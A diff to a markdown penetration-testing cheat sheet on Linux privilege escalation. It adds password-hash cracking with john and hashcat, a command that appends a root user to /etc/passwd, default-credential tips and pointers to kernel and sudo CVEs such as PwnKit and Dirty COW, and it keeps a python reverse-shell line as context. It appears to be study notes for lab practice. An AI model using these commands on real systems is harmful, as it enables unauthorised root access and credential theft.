@@ -165,6 +165,7 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Abusing capabilities](#abusing-capabilities)
     - [Escape shell](#escape-shell)
     - [Docker](#docker)
+    - [Postfix](#postfix)
   - [Windows Privilege Escalation](#windows-privilege-escalation)
     - [Resources](#resources-3)
     - [Privileges](#privileges)
@@ -3985,8 +3986,11 @@ The first time plink connects to a host, it will attempt to cache the host key i
 1. Check your user with `id` and `whoami`
 2. Run [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) with increasing levels
    - starting from lvl `0` to `2`, `./lse.sh -l 0`
-4. Run other scripts
-5. If the scripts fail, run the commands in this section and see [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+3. Run other scripts like `lse_cve.sh`
+4. Check for default / weak credentials
+   - example: `username:username`, `root:root`
+5. Check the directory `opt/` for possible apps to exploit
+6. If the scripts fail, run the commands in this section and see [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 
 #### <ins>Reverse Shell</ins>
 
@@ -4032,10 +4036,22 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 
 **Readable /etc/shadow**
 - Check if `/etc/shadow` is readable with `ls -l /etc/shadow`
-- Run
-  ```
+- ```
   cat /etc/shadow > hash.txt
   john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+  hashcat -m 1800 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
+  ```
+- shadow + passwd
+  ```
+  unshadow passwd shadow > passwords
+  john --wordlist=/usr/share/wordlists/rockyou.txt passwords
+  ```
+
+**Readable /etc/passwd**
+- if you find hashes
+  ```
+  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+  hashcat -m 1800 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
   ```
 
 **Writable /etc/shadow**
@@ -4044,11 +4060,11 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 - Substitute the root password hash with the new hash with `nano /etc/shadow`
 
 **Writable /etc/passwd**
-- Check if `/etc/passwd` is writable with `ls -l /etc/passwd`
-- Generate a new password hash with `openssl passwd newpass`
-- Substitute the root password hash with the new hash with `nano /etc/passwd`
-  - or add a new root user to `/etc/passwd` with `echo 'root2:<password hash>:0:0:root:/root:/bin/bash' >> /etc/passwd`
-    - test the new user with `su root2` and `id`
+1. Check if `/etc/passwd` is writable with `ls -l /etc/passwd`
+2. Generate a new password hash with `openssl passwd newpass`
+3. Substitute the root password hash with the new hash with `nano /etc/passwd`
+   - or add a new root user to `/etc/passwd` with `echo 'root2:<password hash>:0:0:root:/root:/bin/bash' >> /etc/passwd`
+     - test the new user with `su root2` and `id`
 
 
 #### <ins>Exposed Confidential Information</ins>
@@ -4133,6 +4149,10 @@ Path traversal:
     }
     ```
   - Run `apache2` using sudo, while settings the `LD_LIBRARY_PATH` environment variable to `/tmp`, where the output of the compiled shared object is
+
+**sudoedit**
+If you find Sudo < 1.8.15 and something like: `(root) NOPASSWD: sudoedit /home/*/*/recycler.ser`
+- CVE-2015-5602, see https://al1z4deh.medium.com/proving-grounds-cassios-4686e6fa8df6
 
 #### <ins>Cron Jobs</ins>
 
@@ -4267,6 +4287,18 @@ Run:
   - [Dirty COW | CVE-2016-5195](https://dirtycow.ninja/)
   - [CVE-2017-1000112](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000112)
 
+#### <ins>CVE</ins>
+
+- see `/etc/issue`
+- `cat /etc/*release*`
+- CVE-2021-4034 > PwnKit Local Privilege Escalation
+- Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escalation
+- Dirty COW
+  - https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+  - https://dirtycow.ninja/
+  - "Race condition in mm/gup.c in the Linux kernel 2.x through 4.x before 4.8.3 allows local users to gain privileges by leveraging incorrect handling of a copy-on-write (COW) feature to write to a read-only memory mapping, as exploited in the wild in October 2016, aka 'Dirty COW.'"
+- See the general services that are running. For example, you may have found several web ports open during the initial phase, and found different services. See if there are any CVEs or exploits for PE
+
 #### <ins>find with exec</ins>
 - Also known as "Abusing Setuid Binaries"
 - `find /home/username/Desktop -exec "/usr/bin/bash" -p \;`
@@ -4340,6 +4372,12 @@ Docker Container Escape via SNMP
   actionban = reverse shell
   ```
 - trigger the ban with hydra
+
+#### <ins>Postfix</ins>
+
+- [How To Automatically Add A Disclaimer To Outgoing Emails With alterMIME (Postfix On Debian Squeeze)](https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze)
+- [Pg Practice Postfish writeup](https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/postfish)
+
 
 ### <ins>Windows Privilege Escalation</ins>
 
